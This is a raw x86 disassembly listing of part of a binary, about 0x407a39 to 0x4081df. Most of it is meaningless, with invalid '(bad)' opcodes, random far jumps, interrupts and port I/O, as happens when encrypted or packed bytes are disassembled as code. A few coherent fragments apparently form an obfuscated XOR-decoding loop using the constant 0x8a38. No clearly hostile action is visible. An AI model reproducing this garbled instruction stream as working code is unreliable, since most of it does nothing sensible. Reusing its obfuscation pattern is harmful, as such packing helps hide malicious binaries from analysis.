  407a39:	lods   al,BYTE PTR ds:[esi]
  407a3a:	mov    al,ds:0xa800856
  407a3f:	push   eax
  407a40:	scas   al,BYTE PTR es:[edi]
  407a41:	retf   
  407a42:	inc    BYTE PTR [ecx+0x26]
  407a45:	and    al,0x2b
  407a47:	ss enter 0x8ea0,0xd5
  407a4c:	out    dx,eax
  407a4d:	popa   
  407a4e:	sub    cl,BYTE PTR ds:0xdb28a9ea
  407a54:	repnz add cl,BYTE PTR ds:0xad1adf02
  407a5b:	rcr    dh,1
  407a5d:	or     BYTE PTR [esi-0x2e6ff44f],dl
  407a63:	sbb    al,0x6
  407a65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a66:	lock fisub WORD PTR [eax+0x6d]
  407a6a:	mul    DWORD PTR [ebp-0x2ce28e4]
  407a70:	xor    DWORD PTR [edx],eax
  407a72:	out    0xf8,al
  407a74:	push   0x63f67122
  407a79:	inc    ebp
  407a7a:	sbb    al,0xc6
  407a7c:	jae    0x407a64
  407a7e:	out    0x89,eax
  407a80:	ret    
  407a81:	arpl   WORD PTR [ebx],di
  407a83:	xchg   edi,eax
  407a84:	or     esp,DWORD PTR [ecx+0x36]
  407a87:	jb     0x407a13
  407a89:	sahf   
  407a8a:	sti    
  407a8b:	hlt    
  407a8c:	daa    
  407a8d:	inc    ebx
  407a8e:	popf   
  407a8f:	mov    ds:0xce5f20e3,al
  407a94:	pop    ss
  407a95:	xlat   BYTE PTR ds:[ebx]
  407a96:	xor    al,0x86
  407a98:	imul   edi,DWORD PTR [ecx-0x21],0xffffffab
  407a9c:	mov    DWORD PTR [ebx],esp
  407a9e:	mov    DWORD PTR [ebx],ebx
  407aa0:	pop    ds
  407aa1:	cmp    eax,0xb2040820
  407aa6:	add    eax,0x2496e91b
  407aab:	push   esp
  407aac:	aad    0x96
  407aae:	test   eax,0xeb06654c
  407ab3:	xchg   BYTE PTR [ebp+0x435fec62],ah
  407ab9:	fwait
  407aba:	xchg   ebp,eax
  407abb:	int    0xda
  407abd:	inc    eax
  407abe:	dec    ebp
  407abf:	ror    DWORD PTR [edi+0x75f80aa6],cl
  407ac5:	xchg   ecx,eax
  407ac6:	(bad)
  407ac9:	dec    eax
  407aca:	xchg   esi,eax
  407acb:	ror    ebx,cl
  407acd:	inc    ebx
  407ace:	cmp    ecx,ecx
  407ad0:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ad2:	ins    DWORD PTR es:[edi],dx
  407ad3:	loop   0x407a9c
  407ad5:	pop    ss
  407ad6:	xchg   esp,eax
  407ad7:	adc    al,0x47
  407ad9:	mov    DWORD PTR [eax],0x3e035f3c
  407adf:	sbb    dh,bl
  407ae1:	int3   
  407ae2:	pop    edx
  407ae3:	aaa    
  407ae4:	std    
  407ae5:	les    esi,FWORD PTR [edx-0x652bed72]
  407aeb:	mov    ds:0x91300fd8,eax
  407af0:	jmp    0x4313:0xe8dfd4fa
  407af7:	arpl   ax,bx
  407af9:	sub    eax,0xf0458b91
  407afe:	xor    DWORD PTR [eax],0x2650fa8c
  407b04:	jmp    0x4072df
  407b09:	mov    ax,WORD PTR [ebp-0x4]
  407b0d:	mov    edi,DWORD PTR [ebp+0x8]
  407b10:	mov    edi,DWORD PTR [edi]
  407b12:	mov    edx,0x8a38
  407b17:	xor    ax,dx
  407b1a:	mov    edx,0x3afe
  407b1f:	add    ax,dx
  407b22:	jmp    0x407f10
  407b27:	int    0x82
  407b29:	adc    al,0x54
  407b2b:	push   ebp
  407b2c:	pop    esp
  407b2d:	dec    ebp
  407b2e:	xchg   ebx,eax
  407b2f:	leave  
  407b30:	mul    BYTE PTR [ebx-0x4e]
  407b33:	(bad)  
  407b34:	ror    DWORD PTR [ebx],1
  407b36:	lods   al,BYTE PTR ds:[esi]
  407b37:	pop    ecx
  407b38:	(bad)  
  407b39:	jle    0x407bb9
  407b3b:	dec    edi
  407b3c:	jns    0x407bbc
  407b3e:	jle    0x407b8e
  407b40:	add    DWORD PTR [esi+0x6d],edx
  407b43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b44:	jmp    0x1caef607
  407b49:	pop    es
  407b4a:	pop    esp
  407b4b:	jp     0x407b76
  407b4d:	repnz mov cl,0x9e
  407b50:	and    al,0xe8
  407b52:	repz loope 0x407bd3
  407b55:	cmp    al,0x7c
  407b57:	adc    BYTE PTR [eax-0x13],ah
  407b5a:	pop    eax
  407b5b:	jl     0x407aff
  407b5d:	mov    ebx,0xc4e4c7bd
  407b62:	cld    
  407b63:	cmovno esi,DWORD PTR [edx]
  407b66:	lahf   
  407b67:	mov    eax,0xa3952640
  407b6c:	mov    ch,BYTE PTR [esi]
  407b6e:	out    dx,eax
  407b6f:	mov    dh,0x19
  407b71:	in     eax,dx
  407b72:	cmp    BYTE PTR [eax+0xda2d2ef],0xbc
  407b79:	fcmovnu st,st(2)
  407b7b:	cmp    edx,DWORD PTR cs:[edx-0x4]
  407b7f:	mov    bh,0xbf
  407b81:	rcl    DWORD PTR [edx-0x44c5804b],1
  407b87:	dec    ebx
  407b88:	mov    ecx,0x82387711
  407b8d:	enter  0x5fa4,0x5d
  407b91:	jl     0x407b48
  407b93:	jge    0x407ba1
  407b95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b96:	mov    edx,0x5c3702c1
  407b9b:	xor    eax,0xe8e2906
  407ba0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ba1:	inc    esi
  407ba2:	push   0xffffffe8
  407ba4:	js     0x407b73
  407ba6:	jns    0x407c03
  407ba8:	jmp    0xeffd:0xaefa2205
  407baf:	cmp    BYTE PTR [ebx],ah
  407bb1:	addr16 addr16 dec ebp
  407bb4:	mov    eax,0x704bdffd
  407bb9:	cmp    BYTE PTR [eax+edi*4],0xb1
  407bbd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bbe:	cwde   
  407bbf:	enter  0x5eb1,0x59
  407bc3:	popf   
  407bc4:	in     eax,0x6d
  407bc6:	cmc    
  407bc7:	xor    eax,0x5d9b17ea
  407bcc:	(bad)  
  407bce:	sbb    dl,BYTE PTR [ecx+0x2d80ae08]
  407bd4:	dec    edi
  407bd5:	adc    BYTE PTR [eax+0x58],ch
  407bd8:	sbb    dl,BYTE PTR [edx]
  407bda:	(bad)  
  407bdb:	out    dx,al
  407bdc:	xchg   edx,eax
  407bdd:	pop    es
  407bde:	mov    dh,0xae
  407be0:	fistp  DWORD PTR [ebx+0x72]
  407be3:	bound  eax,QWORD PTR [ebp-0x5303a005]
  407be9:	sbb    al,0x8d
  407beb:	adc    BYTE PTR [eax-0x5041e076],0x7e
  407bf2:	mov    dl,0xf5
  407bf4:	rcl    BYTE PTR [ebx-0x8],1
  407bf7:	mov    BYTE PTR [ebx],dh
  407bf9:	push   es
  407bfa:	cmp    ch,BYTE PTR [ebx]
  407bfc:	imul   ebp,DWORD PTR ds:0x87686db4,0x5ec07948
  407c06:	inc    esp
  407c07:	js     0x407bcc
  407c09:	cdq    
  407c0a:	mov    cl,0x43
  407c0c:	adc    BYTE PTR ds:0x6b0e5149,dh
  407c12:	inc    esp
  407c13:	inc    esi
  407c14:	lds    ebx,FWORD PTR [ebp-0x6]
  407c17:	int3   
  407c18:	xor    DWORD PTR [ecx],0xffffffef
  407c1b:	mov    bl,0xec
  407c1d:	lods   eax,DWORD PTR ds:[esi]
  407c1e:	sub    al,0xb8
  407c20:	jmp    0x95ecf40
  407c25:	sahf   
  407c26:	loope  0x407be6
  407c28:	lods   eax,DWORD PTR ds:[esi]
  407c29:	dec    ebx
  407c2a:	imul   DWORD PTR [ecx]
  407c2c:	and    DWORD PTR [ebp-0x3170fb6d],ebx
  407c32:	lea    eax,[edx+0x2f]
  407c35:	push   eax
  407c36:	aam    0x64
  407c38:	mov    dl,0xb5
  407c3a:	dec    ebx
  407c3b:	inc    ecx
  407c3c:	loopne 0x407be1
  407c3e:	push   0x75c8e9d7
  407c43:	stc    
  407c44:	inc    ecx
  407c45:	adc    eax,0xa0749137
  407c4a:	or     BYTE PTR [ebx],0x26
  407c4d:	inc    esi
  407c4e:	in     al,dx
  407c4f:	cwde   
  407c50:	add    eax,0x52026bca
  407c55:	inc    eax
  407c56:	popf   
  407c57:	push   0x8dbbce13
  407c5c:	adc    DWORD PTR [edi-0x2e6bc26b],ebp
  407c62:	in     al,dx
  407c63:	lock push es
  407c65:	out    dx,eax
  407c66:	cs ret 
  407c68:	inc    ebx
  407c69:	scas   al,BYTE PTR es:[edi]
  407c6a:	dec    ecx
  407c6b:	repnz dec esi
  407c6d:	lea    eax,[ecx-0x34]
  407c70:	xchg   edx,eax
  407c71:	and    dh,BYTE PTR [ecx+0x73]
  407c74:	idiv   DWORD PTR [esi+0x54]
  407c77:	or     ebx,DWORD PTR [ebx]
  407c79:	dec    esp
  407c7a:	cmp    eax,0xffffff80
  407c7d:	ror    BYTE PTR [ebx+0x63375146],cl
  407c83:	dec    ebp
  407c84:	jmp    0x61e2:0x3dc7d035
  407c8b:	push   esi
  407c8c:	sbb    al,0x38
  407c8e:	imul   esi,DWORD PTR [ebx+eax*2-0x5030e728],0xffffffcd
  407c96:	sub    eax,0xb58dd3e8
  407c9b:	jge    0x407cdc
  407c9d:	retf   0x8f84
  407ca0:	push   0xfacb2af9
  407ca5:	es inc esp
  407ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ca8:	cli    
  407ca9:	clc    
  407caa:	data16 xchg BYTE PTR [ecx-0x5b],al
  407cae:	xor    eax,0x5a6019b1
  407cb3:	push   ebx
  407cb4:	mov    cl,0x25
  407cb6:	mov    bl,0x48
  407cb8:	xchg   ebp,eax
  407cb9:	jp     0x407d35
  407cbb:	mov    edi,0x54dde6c6
  407cc0:	loopne 0x407c5b
  407cc2:	addr16 cmp al,0x7
  407cc5:	or     BYTE PTR [esp+esi*1],cl
  407cc8:	xor    edx,ecx
  407cca:	popa   
  407ccb:	adc    al,0x1
  407cce:	das    
  407ccf:	and    al,0x27
  407cd1:	sbb    al,0xc3
  407cd3:	cmp    eax,0x2fd069ed
  407cd8:	dec    BYTE PTR [edi+ebp*4]
  407cdb:	into   
  407cdc:	pop    ds
  407cdd:	xchg   ecx,eax
  407cde:	and    DWORD PTR ds:[esp+edx*2+0x7c383c10],esi
  407ce6:	dec    edi
  407ce7:	les    edx,FWORD PTR [eax+edx*8+0x1f]
  407ceb:	jg     0x407cd6
  407ced:	dec    eax
  407cee:	and    edi,DWORD PTR [edx-0x4a91dac1]
  407cf4:	aas    
  407cf5:	xchg   esp,eax
  407cf6:	daa    
  407cf7:	dec    ebx
  407cf8:	jbe    0x407cf7
  407cfa:	xlat   BYTE PTR ds:[ebx]
  407cfb:	dec    edx
  407cfc:	es pop ecx
  407cfe:	call   0x27ed:0xc3c682fe
  407d05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d06:	xor    ecx,esi
  407d08:	inc    edx
  407d09:	xchg   ecx,eax
  407d0a:	cmc    
  407d0b:	ins    BYTE PTR es:[edi],dx
  407d0c:	outs   dx,DWORD PTR ds:[esi]
  407d0d:	push   edi
  407d0e:	pop    es
  407d0f:	mov    DWORD PTR gs:[ecx],0x9b500eb6
  407d16:	(bad)  
  407d18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d19:	call   0xa06f:0x337b06dd
  407d20:	(bad)  
  407d21:	push   ss
  407d22:	inc    eax
  407d23:	retf   0x6404
  407d26:	sar    dl,0x83
  407d29:	mov    ebp,0xae5d2e03
  407d2e:	fmul   QWORD PTR [ebp+0x288004ce]
  407d34:	mov    ecx,DWORD PTR [ecx-0x2135d323]
  407d3a:	jnp    0x407cf9
  407d3c:	mov    ecx,0x615c4117
  407d41:	mov    cl,0x7b
  407d43:	push   esi
  407d44:	and    al,0xc4
  407d46:	(bad)  
  407d48:	es lahf 
  407d4a:	and    DWORD PTR [edx],ecx
  407d4c:	and    BYTE PTR [edx-0x3da73d61],ah
  407d52:	ss jl  0x407d1b
  407d55:	inc    edx
  407d56:	icebp  
  407d57:	jp     0x407d63
  407d59:	sub    al,0xc2
  407d5b:	adc    al,0xa2
  407d5d:	and    ch,cl
  407d5f:	inc    edi
  407d60:	jle    0x407d0a
  407d62:	fistp  QWORD PTR ds:[ecx-0x61679b20]
  407d69:	jne    0x407d8d
  407d6b:	arpl   WORD PTR [ebp+0x69a66d9b],di
  407d71:	mov    eax,ds:0xb115564a
  407d76:	call   0xeafc6ded
  407d7b:	dec    eax
  407d7c:	jp     0x407d65
  407d7e:	or     al,BYTE PTR [ebp-0x7a]
  407d81:	out    0xef,al
  407d83:	jecxz  0x407d52
  407d85:	jmp    0x407d16
  407d87:	ins    BYTE PTR es:[edi],dx
  407d88:	aaa    
  407d89:	and    eax,esi
  407d8b:	push   cs
  407d8c:	cmp    BYTE PTR [ebp-0x42],0x82
  407d90:	les    eax,FWORD PTR [edi]
  407d92:	int    0xf
  407d94:	call   0x7a6b564e
  407d99:	dec    esp
  407d9a:	mov    edi,0x93ae370e
  407d9f:	sub    ch,0x49
  407da2:	xor    eax,0x97dab019
  407da7:	(bad)  [edx+0x1]
  407daa:	stos   DWORD PTR es:[edi],eax
  407dab:	cmp    al,0x18
  407dad:	imul   ebp,DWORD PTR [ecx+0x64],0xa376b94a
  407db4:	and    BYTE PTR [edi],bh
  407db6:	jbe    0x407d6f
  407db8:	outs   dx,BYTE PTR ds:[esi]
  407db9:	jo     0x407dfb
  407dbb:	mov    bl,0x8a
  407dbd:	out    dx,eax
  407dbe:	sbb    BYTE PTR [edi-0x67],0xf6
  407dc2:	or     eax,0x94f74bf1
  407dc7:	sbb    eax,0x27edf69a
  407dcc:	dec    eax
  407dcd:	lds    esp,FWORD PTR [ebx-0x4b]
  407dd0:	pop    esp
  407dd1:	adc    DWORD PTR [edi+0x34],esp
  407dd4:	push   0xffffffee
  407dd6:	nop
  407dd7:	cwde   
  407dd8:	addr16 push ds
  407dda:	push   ss
  407ddb:	mov    ah,0x7b
  407ddd:	repnz dec esp
  407ddf:	and    al,0xf6
  407de1:	mov    DWORD PTR [ecx+edx*2],edi
  407de4:	lock jo 0x407dd2
  407de7:	or     ebx,DWORD PTR [edx]
  407de9:	inc    esi
  407dea:	stos   BYTE PTR es:[edi],al
  407deb:	popa   
  407dec:	mov    edi,0x16a2cec1
  407df1:	leave  
  407df2:	test   BYTE PTR [ebp+0x8],al
  407df5:	nop
  407df6:	int    0xb8
  407df8:	xchg   ah,dl
  407dfa:	inc    esp
  407dfb:	adc    ah,al
  407dfd:	xor    eax,0xfb0749f0
  407e02:	push   edi
  407e03:	sub    BYTE PTR [ecx],bl
  407e05:	gs cmc 
  407e07:	jg     0x407e56
  407e09:	mov    cl,0xe6
  407e0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407e0c:	jle    0x407d8e
  407e0e:	(bad)  
  407e0f:	imul   edx,DWORD PTR [edx+eiz*4],0xffffffd3
  407e13:	and    eax,0xf399bd03
  407e18:	ins    DWORD PTR es:[edi],dx
  407e19:	or     eax,0xde482d4e
  407e1e:	test   DWORD PTR [edx+0x48],ebx
  407e21:	push   cs
  407e22:	dec    esp
  407e23:	sbb    ch,dh
  407e25:	lahf   
  407e26:	lods   eax,DWORD PTR ds:[esi]
  407e27:	xchg   esp,eax
  407e28:	or     dh,BYTE PTR [ecx]
  407e2a:	push   edx
  407e2b:	pushf  
  407e2c:	ja     0x407e95
  407e2e:	clc    
  407e2f:	inc    ecx
  407e30:	inc    esp
  407e31:	cmp    ebx,DWORD PTR [eax]
  407e33:	add    al,BYTE PTR [edx-0xf]
  407e36:	mov    bh,0xd2
  407e38:	aas    
  407e39:	aaa    
  407e3a:	enter  0x19dc,0xbd
  407e3e:	or     eax,0x9cce1daa
  407e43:	loope  0x407e00
  407e45:	inc    edi
  407e46:	dec    ecx
  407e47:	je     0x407dee
  407e49:	stos   DWORD PTR es:[edi],eax
  407e4a:	ins    BYTE PTR es:[edi],dx
  407e4b:	sub    ebp,DWORD PTR ds:0xe439b6f5
  407e51:	stos   BYTE PTR es:[edi],al
  407e52:	mov    dh,0xb
  407e54:	cmp    DWORD PTR [eax+0x52cdb619],edi
  407e5a:	in     al,0x76
  407e5c:	dec    ecx
  407e5d:	fcomp  QWORD PTR fs:[eax-0x50]
  407e61:	leave  
  407e62:	pop    ebx
  407e63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e64:	sub    edx,DWORD PTR [edx+0x5]
  407e67:	outs   dx,DWORD PTR ds:[esi]
  407e68:	dec    ecx
  407e69:	inc    ebx
  407e6a:	out    dx,eax
  407e6b:	mov    ?,WORD PTR [eax+ecx*1+0x18377c32]
  407e72:	adc    ebp,DWORD PTR [ecx+ebx*8+0x24]
  407e76:	jge    0x407e84
  407e78:	sub    eax,0x8aa35e9
  407e7d:	fistp  QWORD PTR [esi-0x1]
  407e80:	in     eax,dx
  407e81:	inc    esp
  407e82:	outs   dx,DWORD PTR ds:[esi]
  407e83:	(bad)  
  407e84:	mov    ebp,0xf6a74431
  407e89:	(bad)  
  407e8a:	sub    DWORD PTR ds:0x5f35d45f,edx
  407e90:	add    eax,0x6888a400
  407e95:	fisub  DWORD PTR [ebx]
  407e97:	shl    BYTE PTR [ecx+ebx*2-0x27e86c0c],cl
  407e9e:	jl     0x407f17
  407ea0:	jbe    0x407eda
  407ea2:	jnp    0x407e2a
  407ea4:	aad    0x5a
  407ea6:	sub    BYTE PTR [esi],bl
  407ea8:	cld    
  407ea9:	sub    BYTE PTR [ecx+ebx*1+0x64d3dfe],bl
  407eb0:	into   
  407eb1:	cmp    DWORD PTR [eax-0x7760fa14],0xfffffff7
  407eb8:	push   edi
  407eb9:	mov    ebp,0x16f5b87
  407ebe:	jl     0x407e42
  407ec0:	mov    eax,ds:0xb19c1ead
  407ec5:	in     eax,0xd1
  407ec7:	jecxz  0x407f34
  407ec9:	jg     0x407e79
  407ecb:	jle    0x407eda
  407ecd:	mov    edi,0xcae16dae
  407ed2:	mov    ch,0x83
  407ed4:	jb     0x407e68
  407ed6:	xchg   esp,eax
  407ed7:	inc    ecx
  407ed8:	aad    0x1f
  407eda:	call   0x7bdf0c9
  407edf:	enter  0x875b,0x5d
  407ee3:	sub    DWORD PTR [ecx-0x24],ebp
  407ee6:	inc    eax
  407ee7:	fisub  WORD PTR [ebp-0x3a884372]
  407eed:	sub    DWORD PTR [edx-0x531a6dce],ebp
  407ef3:	pop    ebx
  407ef4:	clc    
  407ef5:	pop    esi
  407ef6:	in     eax,dx
  407ef7:	(bad)  
  407ef9:	sbb    esi,esp
  407efb:	out    0x4a,eax
  407efd:	imul   edi,DWORD PTR [edi],0xf7d4a418
  407f03:	adc    DWORD PTR [eax+ebp*8+0x140395f2],0xfaf8e4e
  407f0e:	mov    ah,0xda
  407f10:	cmp    ax,WORD PTR [edi]
  407f13:	je     0x407f60
  407f19:	mov    eax,DWORD PTR [ebp-0x14]
  407f1c:	xor    eax,ecx
  407f1e:	add    eax,esi
  407f20:	mov    DWORD PTR [ebp-0x24],eax
  407f23:	mov    eax,DWORD PTR [ebp-0x28]
  407f26:	mov    di,WORD PTR [ebp-0x2c]
  407f2a:	mov    ebx,0x8a38
  407f2f:	xor    di,bx
  407f32:	add    di,dx
  407f35:	movzx  edx,di
  407f38:	mov    edi,DWORD PTR [ebp-0x8]
  407f3b:	xor    edi,ecx
  407f3d:	lea    edx,[edx+edi*1+0x327299]
  407f44:	add    DWORD PTR [eax],edx
  407f46:	mov    eax,DWORD PTR [ebp-0x20]
  407f49:	mov    edx,DWORD PTR [ebp-0x8]
  407f4c:	mov    edi,DWORD PTR [ebp-0x24]
  407f4f:	xor    edx,ecx
  407f51:	add    edx,esi
  407f53:	imul   edx,edi
  407f56:	sub    DWORD PTR [eax],edx
  407f58:	mov    eax,DWORD PTR [ebp-0x14]
  407f5b:	jmp    0x4072e2
  407f60:	mov    eax,DWORD PTR [ebp-0xc]
  407f63:	mov    edx,DWORD PTR [ebp-0x18]
  407f66:	jmp    0x408354
  407f6b:	fadd   st,st(0)
  407f6d:	test   eax,0x6177b1f6
  407f72:	ror    BYTE PTR [ebx],1
  407f74:	ins    DWORD PTR es:[edi],dx
  407f75:	pop    eax
  407f76:	jl     0x407f05
  407f78:	pop    edi
  407f79:	jbe    0x407fc3
  407f7b:	stos   BYTE PTR es:[edi],al
  407f7c:	sar    BYTE PTR [esi+0x7e],cl
  407f7f:	dec    edi
  407f80:	jns    0x408000
  407f82:	jle    0x407f90
  407f84:	dec    dh
  407f86:	add    ebp,DWORD PTR [edi-0x3fecc2db]
  407f8c:	test   BYTE PTR ds:0xb500a435,0x28
  407f93:	mov    al,bl
  407f95:	enter  0xa7be,0xcf
  407f99:	shr    ebp,cl
  407f9b:	inc    eax
  407f9c:	jle    0x40800a
  407f9e:	and    al,0xa7
  407fa0:	add    eax,ebp
  407fa2:	jns    0x407fa9
  407fa4:	loope  0x407fb9
  407fa6:	test   DWORD PTR [esi-0x8737229],esp
  407fac:	mov    WORD PTR [eax+0x2e],ds
  407faf:	xchg   esp,eax
  407fb0:	ins    DWORD PTR es:[edi],dx
  407fb1:	dec    esp
  407fb2:	push   cs
  407fb3:	aad    0x73
  407fb5:	or     al,0x62
  407fb7:	out    0x73,eax
  407fb9:	enter  0x53ee,0x99
  407fbd:	sbb    al,0xba
  407fbf:	dec    esi
  407fc0:	enter  0x6855,0x5
  407fc4:	sub    BYTE PTR [ebp-0x5b],0x77
  407fc8:	jae    0x40802d
  407fca:	or     eax,0x2b6311f3
  407fcf:	lds    edi,FWORD PTR [esp+ebx*8-0x6dc101ad]
  407fd6:	jno    0x407f78
  407fd8:	jno    0x407ff7
  407fda:	xor    bl,ah
  407fdc:	mov    ch,0x20
  407fde:	push   ebx
  407fdf:	jl     0x408010
  407fe1:	adc    DWORD PTR [ecx-0x3e],eax
  407fe4:	aam    0x14
  407fe6:	xchg   esp,eax
  407fe7:	jge    0x407fd2
  407fe9:	std    
  407fea:	and    DWORD PTR [esp+eax*8],ebp
  407fed:	mov    al,0xe6
  407fef:	lock pusha 
  407ff1:	ret    0xb272
  407ff4:	sbb    dh,bl
  407ff6:	(bad)  
  407ff7:	sti    
  407ff8:	mov    cl,0x3b
  407ffa:	add    BYTE PTR [esi+eiz*8],al
  407ffd:	leave  
  407ffe:	mul    BYTE PTR [ebx-0x29]
  408001:	push   0xffffffe1
  408003:	mov    ebx,0x4765b6bb
  408008:	iret   
  408009:	idiv   esp
  40800b:	cmp    BYTE PTR [edi+ecx*4+0x33],ah
  40800f:	frstor [edx+0x5a666a68]
  408015:	stos   DWORD PTR es:[edi],eax
  408016:	mov    cl,0x1a
  408018:	aad    0x4b
  40801a:	das    
  40801b:	loop   0x407fc1
  40801d:	int    0x6
  40801f:	adc    al,0xfc
  408021:	popf   
  408022:	or     bh,BYTE PTR [ecx+0x428c7ba7]
  408028:	jnp    0x408079
  40802a:	js     0x407ffe
  40802c:	mov    ds:0xd97ce31a,eax
  408031:	and    eax,0xf208672a
  408036:	mov    bh,0x9e
  408038:	or     ax,0x2d3c
  40803c:	mov    bh,0xf3
  40803e:	ja     0x40805f
  408040:	out    dx,eax
  408041:	and    edx,ebx
  408043:	sub    ch,bh
  408045:	(bad)  
  408046:	push   ebx
  408047:	sbb    ecx,DWORD PTR [ebp-0x6]
  40804a:	shr    BYTE PTR [esi],0x9d
  40804d:	adc    BYTE PTR [eax-0x5654c1c2],dl
  408053:	push   ss
  408054:	pop    es
  408055:	dec    ecx
  408056:	add    dl,dh
  408058:	(bad)  
  408059:	lods   al,BYTE PTR ds:[esi]
  40805a:	mov    edx,0xd1996383
  40805f:	add    eax,0x9ae1d062
  408064:	retf   0x877e
  408067:	ficom  WORD PTR [eax]
  408069:	mov    esp,0x19f4de66
  40806e:	ficomp DWORD PTR [ecx+0x6b8edd47]
  408074:	xchg   edi,eax
  408075:	shr    BYTE PTR [ecx+0x65fd40b2],1
  40807b:	push   esp
  40807c:	pop    ss
  40807d:	adc    dl,BYTE PTR [esi+0x12]
  408080:	aas    
  408081:	xor    BYTE PTR [ecx+0x4],cl
  408084:	pop    edx
  408085:	loop   0x408050
  408087:	sbb    BYTE PTR [edx+0x134d37f9],0xad
  40808e:	jmp    0x4080da
  408090:	ret    0x5b87
  408093:	mov    edx,0x441f8c41
  408098:	push   edx
  408099:	jmp    0x408064
  40809b:	nop
  40809c:	and    al,0xf0
  40809e:	(bad)  
  40809f:	push   0xbe252475
  4080a4:	jbe    0x4080ae
  4080a6:	mov    al,ds:0xf3bd0b81
  4080ab:	add    DWORD PTR [ebx+0xf],edx
  4080ae:	or     BYTE PTR [ebx+0x45f0f888],ah
  4080b4:	pop    ds
  4080b5:	imul   ebp,DWORD PTR ds:0x3ac75b39,0x57fbd03d
  4080bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080c0:	adc    DWORD PTR [ebp+0x39],ebx
  4080c3:	mov    ah,0x27
  4080c5:	rcr    BYTE PTR [edx+ecx*8-0x2a],cl
  4080c9:	call   0x194d2066
  4080ce:	push   eax
  4080cf:	lahf   
  4080d0:	fcmovbe st,st(0)
  4080d2:	aas    
  4080d3:	(bad)  
  4080d4:	jns    0x4080e4
  4080d6:	icebp  
  4080d7:	sbb    al,0x54
  4080d9:	xchg   dl,bh
  4080db:	int    0xef
  4080dd:	fsub   st,st(4)
  4080df:	(bad)  
  4080e0:	cmc    
  4080e1:	add    al,dl
  4080e3:	sub    BYTE PTR [eax],al
  4080e5:	adc    ecx,DWORD PTR [edx]
  4080e7:	aad    0xc3
  4080e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ea:	cmp    ebx,esp
  4080ec:	rol    DWORD PTR [edi+0x580577c0],cl
  4080f2:	push   eax
  4080f3:	jbe    0x4080fd
  4080f5:	mov    dl,0x3c
  4080f7:	ftst   
  4080f9:	fcom   QWORD PTR [edx]
  4080fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080fc:	hlt    
  4080fd:	mov    ch,0xfc
  4080ff:	push   0xc7ac7856
  408104:	mov    edx,0x9e5f20c0
  408109:	rcr    dl,1
  40810b:	inc    esi
  40810c:	push   edi
  40810d:	jl     0x408119
  40810f:	fimul  WORD PTR [ebx]
  408111:	pusha  
  408112:	dec    edx
  408113:	mov    BYTE PTR [edx+0x5b7aecb9],bh
  408119:	ds push eax
  40811b:	data16 jle 0x408144
  40811e:	jb     0x40812a
  408120:	imul   edx,DWORD PTR [esi+0x73203dff],0xc519f40d
  40812a:	inc    edx
  40812b:	fistp  DWORD PTR [edx]
  40812d:	gs test eax,0xc72834e0
  408133:	inc    BYTE PTR [ebp+0x5f]
  408136:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408137:	(bad)  
  408138:	repz mov cl,BYTE PTR ds:[edx-0x5e616f82]
  408140:	cmc    
  408141:	int    0xf2
  408143:	pop    esi
  408144:	inc    eax
  408145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408146:	js     0x40815e
  408148:	ret    0xa7a
  40814b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40814c:	in     eax,dx
  40814d:	std    
  40814e:	dec    ecx
  40814f:	je     0x40816e
  408151:	dec    eax
  408152:	push   ss
  408153:	xchg   BYTE PTR [eax],ch
  408155:	sti    
  408156:	imul   ecx,DWORD PTR [eax-0x12],0x4a
  40815a:	nop
  40815b:	aas    
  40815c:	call   0x6b04:0xc0508f2d
  408163:	mov    ds:0x8220c2d4,eax
  408168:	add    DWORD PTR [esi],ebx
  40816a:	sub    ebx,DWORD PTR [ebx]
  40816c:	mov    al,0x5b
  40816e:	shl    BYTE PTR [ecx-0x19ae998a],0xda
  408175:	pop    esi
  408176:	ss stc 
  408178:	lea    eax,[ecx+0x3d]
  40817b:	test   bl,bh
  40817d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40817e:	cmc    
  40817f:	xchg   ebx,eax
  408180:	cmp    al,cl
  408182:	fiadd  WORD PTR [edi+0x72]
  408185:	jg     0x4081f7
  408187:	fsub   DWORD PTR [eax+ebx*2]
  40818a:	and    edx,esi
  40818c:	clc    
  40818d:	push   cs
  40818e:	inc    ebx
  40818f:	(bad)  
  408190:	push   esp
  408191:	push   ss
  408192:	mov    bh,0x11
  408194:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408195:	ins    BYTE PTR es:[edi],dx
  408196:	iret   
  408197:	xchg   esp,eax
  408198:	ss cs fadd st,st(4)
  40819c:	pop    es
  40819d:	dec    ebx
  40819e:	neg    dh
  4081a0:	jo     0x4081d8
  4081a2:	icebp  
  4081a3:	int3   
  4081a4:	ins    BYTE PTR es:[edi],dx
  4081a5:	pushf  
  4081a6:	xchg   ecx,eax
  4081a7:	jbe    0x40820e
  4081a9:	mov    ecx,0xeca8a522
  4081ae:	pop    edi
  4081af:	xor    DWORD PTR ds:0x8dee0a3e,0x64
  4081b6:	(bad)  
  4081b7:	or     DWORD PTR [edx+0x687f192c],ebp
  4081bd:	sub    DWORD PTR [esi],ecx
  4081bf:	mov    ds:0xea075eb8,al
  4081c4:	mov    bh,0xa0
  4081c6:	adc    BYTE PTR [ecx+0x6519f617],dl
  4081cc:	inc    esp
  4081cd:	fs push ebx
  4081cf:	sbb    al,0x35
  4081d1:	adc    eax,0xcd6e2124
  4081d6:	xor    dh,dl
  4081d8:	jl     0x408169
  4081da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4081db:	mov    WORD PTR [edi],gs
  4081dd:	loopne 0x4081b7
  4081df:	call   0xac5:0x4cbd3e46
